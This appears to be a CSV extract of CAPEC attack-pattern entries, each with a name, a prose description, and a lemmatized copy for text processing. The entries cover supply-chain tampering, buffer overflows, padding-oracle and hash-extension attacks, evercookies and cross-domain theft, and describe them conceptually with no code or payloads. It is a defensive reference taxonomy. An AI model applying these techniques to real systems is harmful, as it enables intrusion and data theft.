CAPEC-433,Target Influence via The Human Buffer Overflow,"An attacker utilizes a technique to insinuate commands to the subconscious mind of the target via communication patterns. The human buffer overflow methodology does not rely on over-stimulating the mind of the target, but rather embedding messages within communication that the mind of the listener assembles at a subconscious level. The human buffer-overflow method is similar to subconscious programming to the extent that messages are embedded within the message.The fundamental difference is that embedded messages have a complete semantic quality, rather than mere imagery, and the mind of the target tends to key off of particular dominant patterns. The remaining information, carefully structured, speaks directly to the subconscious with a subtle, indirect, command. The effect is to produce a pattern of thinking that the attacker has predetermined but is buried within the message and not overtly stated. Structuring a human ""buffer overflow"" requires precise attention to detail and the use of information in a manner that distracts the conscious mind from the message the subconscious is receiving.",attacker utilize technique insinuate command subconscious mind target communication pattern human buffer overflow methodology rely stimulate mind target embed message communication mind listener assemble subconscious level human buffer overflow method similar subconscious programming extent message embed message fundamental difference embed message complete semantic quality mere imagery mind target tend key particular dominant pattern remain information carefully structure speak directly subconscious subtle indirect command effect produce pattern thinking attacker predetermine bury message overtly state structure human buffer overflow require precise attention detail use information manner distract conscious mind message subconscious receive
CAPEC-438,Modification During Manufacture,"An attacker modifies a technology, product, or component during a stage in its manufacture for the purpose of carrying out an attack against some entity involved in the supply chain lifecycle. There are an almost limitless number of ways an attacker can modify a technology when they are involved in its manufacture, as the attacker has potential inroads to the software composition, hardware design and assembly, firmware, or basic design mechanics. Additionally, manufacturing of key components is often outsourced with the final product assembled by the primary manufacturer. The greatest risk, however, is deliberate manipulation of design specifications to produce malicious hardware or devices. There are billions of transistors in a single integrated circuit and studies have shown that fewer than 10 transistors are required to create malicious functionality.",attacker modify technology product component stage manufacture purpose carry attack entity involve supply chain lifecycle limitless number way attacker modify technology involve manufacture attacker potential inroad software composition hardware design assembly firmware basic design mechanic additionally manufacturing key component outsource final product assemble primary manufacturer great risk deliberate manipulation design specification produce malicious hardware device billion transistor single integrated circuit study show few transistor require create malicious functionality
CAPEC-439,Manipulation During Distribution,"An attacker undermines the integrity of a product, software, or technology at some stage of the distribution channel. The core threat of modification or manipulation during distribution arise from the many stages of distribution, as a product may traverse multiple suppliers and integrators as the final asset is delivered. Components and services provided from a manufacturer to a supplier may be tampered with during integration or packaging.",attacker undermine integrity product software technology stage distribution channel core threat modification manipulation distribution arise stage distribution product traverse multiple supplier integrator final asset deliver component service provide manufacturer supplier tamper integration packaging
CAPEC-44,Overflow Binary Resource File,"An attack of this type exploits a buffer overflow vulnerability in the handling of binary resources. Binary resources may include music files like MP3, image files like JPEG files, and any other binary file. These attacks may pass unnoticed to the client machine through normal usage of files, such as a browser loading a seemingly innocent JPEG file. This can allow the adversary access to the execution stack and execute arbitrary code in the target process.This attack pattern is a variant of standard buffer overflow attack using an unexpected vector (binary files) to wrap its attack and open up a new attack vector. The adversary is required to either directly serve the binary content to the victim, or place it in a locale like a MP3 sharing application for the victim to download. The adversary then is notified upon the download or otherwise locates the vulnerability opened up by the buffer overflow.",attack type exploit buffer overflow vulnerability handling binary resource binary resource include music file like image file like jpeg file binary file attack pass unnoticed client machine normal usage file browser load seemingly innocent jpeg file allow adversary access execution stack execute arbitrary code target process attack pattern variant standard buffer overflow attack unexpected vector binary file wrap attack open new attack vector adversary require directly serve binary content victim place locale like sharing application victim download adversary notify download locate vulnerability open buffer overflow
CAPEC-440,Hardware Integrity Attack,"An adversary exploits a weakness in the system maintenance process and causes a change to be made to a technology, product, component, or sub-component or a new one installed during its deployed use at the victim location for the purpose of carrying out an attack.",adversary exploit weakness system maintenance process cause change technology product component sub component new instal deploy use victim location purpose carry attack
CAPEC-441,Malicious Logic Insertion,"An adversary installs or adds malicious logic (also known as malware) into a seemingly benign component of a fielded system. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. With the proliferation of mass digital storage and inexpensive multimedia devices, Bluetooth and 802.11 support, new attack vectors for spreading malware are emerging for things we once thought of as innocuous greeting cards, picture frames, or digital projectors. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems and their components that are still under development and part of the supply chain.",adversary install add malicious logic know malware seemingly benign component field system logic hide user system work scene achieve negative impact proliferation mass digital storage inexpensive multimedia device bluetooth support new attack vector spread malware emerge thing think innocuous greeting card picture frame digital projector pattern attack focus system field operation oppose system component development supply chain
CAPEC-442,Infected Software,"An adversary adds malicious logic, often in the form of a computer virus, to otherwise benign software. This logic is often hidden from the user of the software and works behind the scenes to achieve negative impacts. Many times, the malicious logic is inserted into empty space between legitimate code, and is then called when the software is executed. This pattern of attack focuses on software already fielded and used in operation as opposed to software that is still under development and part of the supply chain.",adversary add malicious logic form computer virus benign software logic hide user software work scene achieve negative impact time malicious logic insert space legitimate code call software execute pattern attack focus software field operation oppose software development supply chain
CAPEC-443,Malicious Logic Inserted Into Product by Authorized Developer,"An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product.Supply chain attacks from approved or trusted developers are extremely difficult to detect as it is generally assumed the quality control and internal security measures of these organizations conform to best practices. In some cases the malicious logic is intentional, embedded by a disgruntled employee, programmer, or individual with an otherwise hidden agenda. In other cases, the integrity of the product is compromised by accident (e.g. by lapse in the internal security of the organization that results in a product becoming contaminated). In further cases, the developer embeds a backdoor into a product to serve some purpose, such as product support, but discovery of the backdoor results in its malicious use by adversaries. It is also worth noting that this attack can occur during initial product development or throughout a product's sustainment.",adversary use privileged position authorized development organization inject malicious logic codebase product supply chain attack approved trust developer extremely difficult detect generally assume quality control internal security measure organization conform good practice case malicious logic intentional embed disgruntled employee programmer individual hidden agenda case integrity product compromise accident lapse internal security organization result product contaminated case developer embed backdoor product serve purpose product support discovery backdoor result malicious use adversary worth note attack occur initial product development product sustainment
CAPEC-444,Development Alteration,"An adversary modifies a technology, product, or component during its development to acheive a negative impact once the system is deployed. The goal of the adversary is to modify the system in such a way that the negative impact can be leveraged when the system is later deployed. Development alteration attacks may include attacks that insert malicious logic into the system's software, modify or replace hardware components, and other attacks which negatively impact the system during development. These attacks generally require insider access to modify source code or to tamper with hardware components. The product is then delivered to the user where the negative impact can be leveraged at a later time.",adversary modify technology product component development acheive negative impact system deploy goal adversary modify system way negative impact leverage system later deploy development alteration attack include attack insert malicious logic system software modify replace hardware component attack negatively impact system development attack generally require insider access modify source code tamper hardware component product deliver user negative impact leverage later time
CAPEC-445,Malicious Logic Insertion into Product Software via Configuration Management Manipulation,"An adversary exploits a configuration management system so that malicious logic is inserted into a software products build, update or deployed environment. If an adversary can control the elements included in a product's configuration management for build they can potentially replace, modify or insert code files containing malicious logic. If an adversary can control elements of a product's ongoing operational configuration management baseline they can potentially force clients receiving updates from the system to install insecure software when receiving updates from the server.Configuration management servers operate on the basis of a client pool, instructing each client on which software to install. In some cases the configuration management server will automate the software installation process. A malicious insider or an adversary who has compromised the server can alter the software baseline that clients must install, allowing the adversary to compromise a large number of satellite machines using the configuration management system. If an adversary can control elements of a product's configuration management for its deployed environment they can potentially alter fundamental security properties of the system based on assumptions that secure configurations are in place. It is also worth noting that this attack can occur during initial product development or throughout a product's sustainment.",adversary exploit configuration management system malicious logic insert software product build update deploy environment adversary control element include product configuration management build potentially replace modify insert code file contain malicious logic adversary control element product ongoing operational configuration management baseline potentially force client receive update system install insecure software receive update server configuration management server operate basis client pool instruct client software install case configuration management server automate software installation process malicious insider adversary compromise server alter software baseline client install allow adversary compromise large number satellite machine configuration management system adversary control element product configuration management deploy environment potentially alter fundamental security property system base assumption secure configuration place worth note attack occur initial product development product sustainment
CAPEC-446,Malicious Logic Insertion into Product via Inclusion of Third-Party Component,"An adversary conducts supply chain attacks by the inclusion of insecure third-party components into a technology, product, or code-base, possibly packaging a malicious driver or component along with the product before shipping it to the consumer or acquirer.The result is a window of opportunity for exploiting the product until the insecure component is discovered. This supply chain threat can result in the installation of malicious software or hardware that introduces widespread security vulnerabilities within an organization. Additionally, because software often depends upon a large number of interdependent libraries and components to be present, security holes can be introduced merely by installing Commercial off the Shelf (COTS) or Open Source Software (OSS) software that comes pre-packaged with the components required for it to operate. It is also worth noting that this attack can occur during initial product development or throughout a product's sustainment.",adversary conduct supply chain attack inclusion insecure party component technology product code base possibly package malicious driver component product ship consumer acquirer result window opportunity exploit product insecure component discover supply chain threat result installation malicious software hardware introduce widespread security vulnerability organization additionally software depend large number interdependent library component present security hole introduce merely instal commercial shelf cots open source software oss software come pre package component require operate worth note attack occur initial product development product sustainment
CAPEC-447,Design Alteration,"An adversary modifies the design of a technology, product, or component to acheive a negative impact once the system is deployed. In this type of attack, the goal of the adversary is to modify the design of the system, prior to development starting, in such a way that the negative impact can be leveraged when the system is later deployed. Design alteration attacks differ from development alteration attacks in that design alteration attacks take place prior to development and which then may or may not be developed by the adverary. Design alteration attacks include modifying system designs to degrade system performance, cause unexpected states or errors, and general design changes that may lead to additional vulnerabilities. These attacks generally require insider access to modify design documents, but they may also be spoofed via web communications. The product is then developed and delivered to the user where the negative impact can be leveraged at a later time.",adversary modify design technology product component acheive negative impact system deploy type attack goal adversary modify design system prior development start way negative impact leverage system later deploy design alteration attack differ development alteration attack design alteration attack place prior development develop adverary design alteration attack include modify system design degrade system performance cause unexpected state error general design change lead additional vulnerability attack generally require insider access modify design document spoof web communication product develop deliver user negative impact leverage later time
CAPEC-448,Embed Virus into DLL,"An adversary tampers with a DLL and embeds a computer virus into gaps between legitimate machine instructions. These gaps may be the result of compiler optimizations that pad memory blocks for performance gains. The embedded virus then attempts to infect any machine which interfaces with the product, and possibly steal private data or eavesdrop.",adversary tamper dll embed computer virus gap legitimate machine instruction gap result compiler optimization pad memory block performance gain embedded virus attempt infect machine interface product possibly steal private datum eavesdrop
CAPEC-45,Buffer Overflow via Symbolic Links,"This type of attack leverages the use of symbolic links to cause buffer overflows. An adversary can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.",type attack leverage use symbolic link cause buffer overflow adversary try create manipulate symbolic link file content result bound datum target software process symbolic link file potentially overflow internal buffer insufficient bound checking
CAPEC-452,Infected Hardware,"An adversary inserts malicious logic into hardware, typically in the form of a computer virus or rootkit. This logic is often hidden from the user of the hardware and works behind the scenes to achieve negative impacts. This pattern of attack focuses on hardware already fielded and used in operation as opposed to hardware that is still under development and part of the supply chain.",adversary insert malicious logic hardware typically form computer virus rootkit logic hide user hardware work scene achieve negative impact pattern attack focus hardware field operation oppose hardware development supply chain
CAPEC-456,Infected Memory,An adversary inserts malicious logic into memory enabling them to achieve a negative impact. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems that are still under development and part of the supply chain.,adversary insert malicious logic memory enable achieve negative impact logic hide user system work scene achieve negative impact pattern attack focus system field operation oppose system development supply chain
CAPEC-457,USB Memory Attacks,"An adversary loads malicious code onto a USB memory stick in order to infect any system which the device is plugged in to. USB drives present a significant security risk for business and government agencies. Given the ability to integrate wireless functionality into a USB stick, it is possible to design malware that not only steals confidential data, but sniffs the network, or monitor keystrokes, and then exfiltrates the stolen data off-site via a Wireless connection. Also, viruses can be transmitted via the USB interface without the specific use of a memory stick. The attacks from USB devices are often of such sophistication that experts conclude they are not the work of single individuals, but suggest state sponsorship. These attacks can be performed by an adversary with direct access to a target system or can be executed via means such as USB Drop Attacks.",adversary load malicious code usb memory stick order infect system device plug usb drive present significant security risk business government agency give ability integrate wireless functionality usb stick possible design malware steal confidential datum sniff network monitor keystroke exfiltrate steal datum site wireless connection virus transmit usb interface specific use memory stick attack usb device sophistication expert conclude work single individual suggest state sponsorship attack perform adversary direct access target system execute mean usb drop attacks
CAPEC-458,Flash Memory Attacks,"An adversary inserts malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. Various attacks exist against the integrity of flash memory, the most direct being rootkits coded into the BIOS or chipset of a device.Such attacks are very difficult to detect because the malicious code resides outside the filesystem or RAM, and in the underlying byte-code that drives the processor. Many devices, such as the recent attacks against digital picture frames, contain only a microprocessor and a small amount of solid-state memory, rendering these devices ideal for ""flash"" based malware or malicious logic.One of the pernicious characteristics of flash memory based attacks is that the malicious code can survive even a total format of the hard-drive and reinstallation of the host operating system. Virtually any device which can be integrated into a computer system is susceptible to these attacks. Additionally, any peripheral device which interfaces with the computer bus could extract or sniff confidential data, even on systems employing full-disk encryption. Trojan code placed into a video card's chipset would continue to perform its function irrespective of the host operating system, and would be invisible to all known antivirus. The threats extend to consumer products such as camcorders, digital cameras, or any consumer electronic device with an embedded microcontroller.",adversary insert malicious logic product technology flash board memory code base contain malicious logic attack exist integrity flash memory direct rootkit code bios chipset device attack difficult detect malicious code reside outside filesystem ram underlying byte code drive processor device recent attack digital picture frame contain microprocessor small solid state memory render device ideal flash base malware malicious logic pernicious characteristic flash memory base attack malicious code survive total format hard drive reinstallation host operate system virtually device integrate computer system susceptible attack additionally peripheral device interface computer bus extract sniff confidential datum system employ disk encryption trojan code place video card chipset continue perform function irrespective host operate system invisible known antivirus threat extend consumer product camcorder digital camera consumer electronic device embed microcontroller
CAPEC-459,Creating a Rogue Certification Authority Certificate,"An adversary exploits a weakness resulting from using a hashing algorithm with weak collision resistance to generate certificate signing requests (CSR) that contain collision blocks in their ""to be signed"" parts. The adversary submits one CSR to be signed by a trusted certificate authority then uses the signed blob to make a second certificate appear signed by said certificate authority. Due to the hash collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate. The net effect is that the adversary's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority.Alternatively, the second certificate could be a signing certificate. Thus the adversary is able to start their own Certification Authority that is anchored in its root of trust in the legitimate Certification Authority that has signed the attacker's first X.509 certificate. If the original Certificate Authority was accepted by default by browsers, so will the Certificate Authority set up by the adversary and any certificates that it signs. As a result, the adversary is able to generate any SSL certificates to impersonate any web server, and the user's browser will not issue any warning to the victim. This can be used to compromise HTTPS communications and other types of systems where PKI and X.509 certificates may be used (e.g., VPN, IPSec).",adversary exploit weakness result hashing algorithm weak collision resistance generate certificate signing request csr contain collision block sign part adversary submit csr sign trust certificate authority use sign blob second certificate appear sign said certificate authority hash collision certificate different hash value sign blob work second certificate net effect adversary second certificate certification authority see sign validate certification authority alternatively second certificate signing certificate adversary able start certification authority anchor root trust legitimate certification authority sign attacker certificate original certificate authority accept default browser certificate authority set adversary certificate sign result adversary able generate ssl certificate impersonate web server user browser issue warning victim compromise https communication type system pki certificate vpn ipsec
CAPEC-46,Overflow Variables and Tags,"This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The adversary crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow.",type attack leverage use tag variable format configuration datum cause buffer overflow adversary craft malicious html page configuration file include oversized string cause overflow
CAPEC-460,HTTP Parameter Pollution (HPP),"An adversary adds duplicate HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules.",adversary add duplicate http post parameter inject query string delimiter hpp possible override exist hardcode http parameter modify application behavior access potentially exploit uncontrollable variable bypass input validation checkpoint waf rule
CAPEC-461,Web Services API Signature Forgery Leveraging Hash Function Extension Weakness,"An adversary utilizes a hash function extension/padding weakness, to modify the parameters passed to the web service requesting authentication by generating their own call in order to generate a legitimate signature hash (as described in the notes), without knowledge of the secret token sometimes provided by the web service.When web services require callees to authenticate, they sometimes issue a token / secret to the caller that the caller is to use to sign their web service calls. In one such scheme the caller, when constructing a request, would concatenate all of the parameters passed to the web service with the provided authentication token and then generate a hash of the concatenated string (e.g., MD5, SHA1, etc.). That hash then forms the signature that is passed to the web service which is used on the server side to verify the origin authenticity and integrity of the message. Because of the iterative design of the hash function, it is possible, from only the hash of a message and its length, for an adversary to conduct signature forgery by computing the hash of longer messages that start with the initial message and include the padding required for the initial message to reach a multiple of 512 bits. It is important to note that the attack not limited to MD5 and will work on other hash functions such as SHA1.",adversary utilize hash function extension padding weakness modify parameter pass web service request authentication generate order generate legitimate signature hash describe note knowledge secret token provide web service web service require callee authenticate issue token secret caller caller use sign web service call scheme caller construct request concatenate parameter pass web service provide authentication token generate hash concatenate string etc hash form signature pass web service server verify origin authenticity integrity message iterative design hash function possible hash message length adversary conduct signature forgery compute hash long message start initial message include padding require initial message reach multiple bit important note attack limit work hash function
CAPEC-462,Cross-Domain Search Timing,"An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's same origin policy prevents the attacker from directly reading the server responses (in the absence of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain.For GET requests an attacker could for instance leverage the ""img"" tag in conjunction with ""onload() / onerror()"" javascript events. For the POST requests, an attacker could leverage the ""iframe"" element and leverage the ""onload()"" event. There is nothing in the current browser security model that prevents an attacker to use these methods to time responses to the attackers' cross domain requests. The timing for these responses leaks information. For instance, if a victim has an active session with their online e-mail account, an attacker could issue search requests in the victim's mailbox. While the attacker is not able to view the responses, based on the timings of the responses, the attacker could ask yes / no questions as to the content of victim's e-mails, who the victim e-mailed, when, etc. This is but one example; There are other scenarios where an attacker could infer potentially sensitive information from cross domain requests by timing the responses while asking the right questions that leak information.",attacker initiate cross domain http request time server response timing response leak important information happen server browser origin policy prevent attacker directly read server response absence weakness prevent attacker time response request attacker issue cross domain request attacker instance leverage img tag conjunction onload onerror javascript event post request attacker leverage iframe element leverage onload event current browser security model prevent attacker use method time response attacker cross domain request timing response leak information instance victim active session online e mail account attacker issue search request victim mailbox attacker able view response base timing response attacker ask yes question content victim e mail victim e mail etc example scenario attacker infer potentially sensitive information cross domain request time response ask right question leak information
CAPEC-463,Padding Oracle Crypto Attack,"An adversary is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an adversary is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an adversary is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key.Any cryptosystem can be vulnerable to padding oracle attacks if the encrypted messages are not authenticated to ensure their validity prior to decryption, and then the information about padding error is leaked to the adversary. This attack technique may be used, for instance, to break CAPTCHA systems or decrypt/modify state information stored in client side objects (e.g., hidden fields or cookies). This attack technique is a side-channel attack on the cryptosystem that uses a data leak from an improperly implemented decryption routine to completely subvert the cryptosystem. The one bit of information that tells the adversary whether a padding error during decryption has occurred, in whatever form it comes, is sufficient for the adversary to break the cryptosystem. That bit of information can come in a form of an explicit error message about a padding error, a returned blank page, or even the server taking longer to respond (a timing attack). This attack can be launched cross domain where an adversary is able to use cross-domain information leaks to get the bits of information from the padding oracle from a target system / service with which the victim is communicating.",adversary able efficiently decrypt datum know decryption key target system leak datum padding error happen decrypt ciphertext target system leak type information padding oracle adversary able use oracle efficiently decrypt datum know decryption key issue average call padding oracle b number byte ciphertext block addition perform decryption adversary able produce valid ciphertext perform encryption padding oracle know encryption key cryptosystem vulnerable padding oracle attack encrypt message authenticate ensure validity prior decryption information padding error leak adversary attack technique instance break captcha system decrypt modify state information store client object hidden field cookie attack technique channel attack cryptosystem use data leak improperly implement decryption routine completely subvert cryptosystem bit information tell adversary padding error decryption occur form come sufficient adversary break cryptosystem bit information come form explicit error message padding error return blank page server take long respond timing attack attack launch cross domain adversary able use cross domain information leak bit information padding oracle target system service victim communicate
CAPEC-464,Evercookie,"An attacker creates a very persistent cookie that stays present even after the user thinks it has been removed. The cookie is stored on the victim's machine in over ten places. When the victim clears the cookie cache via traditional means inside the browser, that operation removes the cookie from certain places but not others. The malicious code then replicates the cookie from all of the places where it was not deleted to all of the possible storage locations once again. So the victim again has the cookie in all of the original storage locations. In other words, failure to delete the cookie in even one location will result in the cookie's resurrection everywhere. The evercookie will also persist across different browsers because certain stores (e.g., Local Shared Objects) are shared between different browsers.The places a persistent cookie is stored on a victim's machine include: Standard HTTP Cookies, Local Shared Objects (Flash Cookies), Silverlight Isolated Storage, Storing cookies in RGB values of auto-generated, force-cached, PNGs using HTML5 Canvas tag to read pixels (cookies) back out, Storing cookies in Web History, Storing cookies in HTTP ETags, Storing cookies in Web cache, window.name caching, Internet Explorer userData storage, HTML5 Session Storage, HTML5 Local Storage, HTML5 Global Storage, HTML5 Database Storage via SQLite, among others.",attacker create persistent cookie stay present user think remove cookie store victim machine place victim clear cookie cache traditional mean inside browser operation remove cookie certain place malicious code replicate cookie place delete possible storage location victim cookie original storage location word failure delete cookie location result cookie resurrection evercookie persist different browser certain store local shared objects share different browser place persistent cookie store victim machine include standard http cookies local shared object flash cookie silverlight isolated storage store cookie rgb value auto generate force cache png canvas tag read pixel cookie store cookie web history store cookie http etag store cookie web cache caching internet explorer userdata storage session storage local storage global storage database storage sqlite
CAPEC-465,Transparent Proxy Abuse,"A transparent proxy serves as an intermediate between the client and the internet at large. It intercepts all requests originating from the client and forwards them to the correct location. The proxy also intercepts all responses to the client and forwards these to the client. All of this is done in a manner transparent to the client.Transparent proxies are often used by enterprises and ISPs. For requests originating at the client transparent proxies need to figure out the final destination of the client's data packet. Two ways are available to do that: either by looking at the layer three (network) IP address or by examining layer seven (application) HTTP header destination. A browser has same origin policy that typically prevents scripts coming from one domain initiating requests to other websites from which they did not come. To circumvent that, however, malicious Flash or an Applet that is executing in the user's browser can attempt to create a cross-domain socket connection from the client to the remote domain. The transparent proxy will examine the HTTP header of the request and direct it to the remote site thereby partially bypassing the browser's same origin policy. This can happen if the transparent proxy uses the HTTP host header information for addressing rather than the IP address information at the network layer. This attack allows malicious scripts inside the victim's browser to issue cross-domain requests to any hosts accessible to the transparent proxy.",transparent proxy serve intermediate client internet large intercept request originate client forward correct location proxy intercept response client forward client manner transparent client transparent proxy enterprise isp request originate client transparent proxy need figure final destination client data packet way available look layer network ip address examine layer seven application http header destination browser origin policy typically prevent script come domain initiate request website come circumvent malicious flash applet execute user browser attempt create cross domain socket connection client remote domain transparent proxy examine http header request direct remote site partially bypass browser origin policy happen transparent proxy use http host header information addressing ip address information network layer attack allow malicious script inside victim browser issue cross domain request host accessible transparent proxy
CAPEC-466,Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy,"An attacker leverages an adversary in the middle attack (CAPEC-94) in order to bypass the same origin policy protection in the victim's browser. This active adversary in the middle attack could be launched, for instance, when the victim is connected to a public WIFI hot spot. An attacker is able to intercept requests and responses between the victim's browser and some non-sensitive website that does not use TLS.When an attacker intercepts a response bound to the victim, an attacker adds an iFrame (which is possibly invisible) to the response referencing some domain with sensitive functionality and forwards the response to the victim. The victim's browser than automatically initiates an unauthorized request to the site with sensitive functionality. The same origin policy would prevent making these requests to a site other than the one from which the Java Script came, but the attacker once again uses active adversary in the middle to intercept these automatic requests and redirect them to the domain / service with sensitive functionality. Any persistent cookies that the victim has in their browser would be used for these unauthorized requests. The attacker thus actively directs the victim to a site with sensitive functionality. When the site with sensitive functionality responds back to the victim's request, an active adversary in the middle attacker intercepts these responses, injects their own malicious Java Script into these responses, and forwards to the victim's browser. In the victim's browser, that Java Script executes under the restrictions of the site with sensitive functionality and can be used to continue to interact with the sensitive site. So an attacker can execute scripts within the victim's browser on any domains the attacker desires. The attacker is able to use this technique to steal cookies from the victim's browser for whatever site the attacker wants. This applies to both persistent cookies and HTTP only cookies (unlike traditional XSS attacks). An attacker is also able to use this technique to steal authentication credentials for sites that only encrypt the login form, but do not require a secure channel for the initial request to get to the page with the login form. Further the attacker is also able to steal any autocompletion information. This attack pattern can also be used to enable session fixation and cache poisoning attacks. Additional attacks can be enabled as well.",attacker leverage adversary middle attack order bypass origin policy protection victim browser active adversary middle attack launch instance victim connect public wifi hot spot attacker able intercept request response victim browser non sensitive website use attacker intercept response bind victim attacker add iframe possibly invisible response reference domain sensitive functionality forward response victim victim browser automatically initiate unauthorized request site sensitive functionality origin policy prevent make request site java script come attacker use active adversary middle intercept automatic request redirect domain service sensitive functionality persistent cookie victim browser unauthorized request attacker actively direct victim site sensitive functionality site sensitive functionality respond victim request active adversary middle attacker intercept response inject malicious java script response forward victim browser victim browser java script execute restriction site sensitive functionality continue interact sensitive site attacker execute script victim browser domain attacker desire attacker able use technique steal cookie victim browser site attacker want apply persistent cookie http cookie unlike traditional xss attack attacker able use technique steal authentication credential site encrypt login form require secure channel initial request page login form attacker able steal autocompletion information attack pattern enable session fixation cache poisoning attack additional attack enable
CAPEC-467,Cross Site Identification,"An attacker harvests identifying information about a victim via an active session that the victim's browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the ""remember me"" feature to keep their session with the social networking site active. An attacker induces a payload to execute in the victim's browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing).There are many other ways in which the attacker may get the payload to execute in the victim's browser mainly by finding a way to hide it in some reputable site that the victim visits. The attacker could also send the link to the victim in an e-mail and trick the victim into clicking on the link. This attack is basically a cross site request forgery attack with two main differences. First, there is no action that is performed on behalf of the user aside from harvesting information. So standard CSRF protection may not work in this situation. Second, what is important in this attack pattern is the nature of the data being harvested, which is identifying information that can be obtained and used in context. This real time harvesting of identifying information can be used as a prelude for launching real time targeted social engineering attacks on the victim.",attacker harvest identifying information victim active session victim browser social networking site victim social networking site open tab simply remember feature session social networking site active attacker induce payload execute victim browser transparently victim initiate request social networking site available social network site api retrieve identify information victim information public attacker able harvest information context use attack user spear way attacker payload execute victim browser mainly find way hide reputable site victim visit attacker send link victim e mail trick victim click link attack basically cross site request forgery attack main difference action perform behalf user aside harvest information standard csrf protection work situation second important attack pattern nature datum harvest identify information obtain context real time harvesting identify information prelude launch real time target social engineering attack victim
CAPEC-468,Generic Cross-Browser Cross-Domain Theft,"An attacker makes use of Cascading Style Sheets (CSS) injection to steal data cross domain from the victim's browser. The attack works by abusing the standards relating to loading of CSS: 1. Send cookies on any load of CSS (including cross-domain) 2. When parsing returned CSS ignore all data that does not make sense before a valid CSS descriptor is found by the CSS parser.By having control of some text in the victim's domain, the attacker is able to inject a seemingly valid CSS string. It does not matter if this CSS string is preceded by other data. The CSS parser will still locate the CSS string. If the attacker is able to control two injection points, one before the cross domain data that the attacker is interested in receiving and the other one after, the attacker can use this attack to steal all of the data in between these two CSS injection points when referencing the injected CSS while performing rendering on the site that the attacker controls. When rendering, the CSS parser will detect the valid CSS string to parse and ignore the data that ""does not make sense"". That data will simply be rendered. That data is in fact the data that the attacker just stole cross domain. The stolen data may contain sensitive information, such CSRF protection tokens.",attacker make use cascading style sheets css injection steal datum cross domain victim browser attack work abuse standard relate loading css send cookie load css include cross domain parse return css ignore datum sense valid css descriptor find css parser have control text victim domain attacker able inject seemingly valid css string matter css string precede datum css parser locate css string attacker able control injection point cross domain datum attacker interested receive attacker use attack steal datum css injection point reference inject css perform rendering site attacker control render css parser detect valid css string parse ignore data sense data simply render data fact datum attacker steal cross domain steal datum contain sensitive information csrf protection token
CAPEC-469,HTTP DoS,An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.,attacker perform flooding http level bring particular web application listen tcp ip connection denial service attack require substantially few packet send make dos hard detect equivalent syn flood http idea http session alive indefinitely repeat hundred time attack target resource depletion weakness web server software web server wait attacker response initiate http session connection thread exhaust
CAPEC-47,Buffer Overflow via Parameter Expansion,"In this attack, the target software is given input that the adversary knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.",attack target software give input adversary know modify expand size processing attack rely target software fail anticipate expand datum exceed internal limit create buffer overflow
CAPEC-470,Expanding Control over the Operating System from the Database,"An attacker is able to leverage access gained to the database to read / write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine. Traditionally SQL injections attacks are viewed as a way to gain unauthorized read access to the data stored in the database, modify the data in the database, delete the data, etc. However, almost every data base management system (DBMS) system includes facilities that if compromised allow an attacker complete access to the file system, operating system, and full access to the host running the database. The attacker can then use this privileged access to launch subsequent attacks. These facilities include dropping into a command shell, creating user defined functions that can call system level libraries present on the host machine, stored procedures, etc.",attacker able leverage access gain database read write datum file system compromise operate system create tunnel access host machine use access potentially attack machine network database machine traditionally sql injection attack view way gain unauthorized read access datum store database modify datum database delete datum etc data base management system dbms system include facility compromise allow attacker complete access file system operating system access host run database attacker use privileged access launch subsequent attack facility include drop command shell create user define function system level library present host machine store procedure etc
CAPEC-471,Search Order Hijacking,An adversary exploits a weakness in an application's specification of external libraries to exploit the functionality of the loader where the process loading the library searches first in the same directory in which the process binary resides and then in other directories. Exploitation of this preferential search order can allow an attacker to make the loading process load the adversary's rogue library rather than the legitimate library. This attack can be leveraged with many different libraries and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect library had been loaded.,adversary exploit weakness application specification external library exploit functionality loader process load library search directory process binary reside directory exploitation preferential search order allow attacker load process load adversary rogue library legitimate library attack leverage different library different loading process forensic trail leave system registry file system incorrect library load
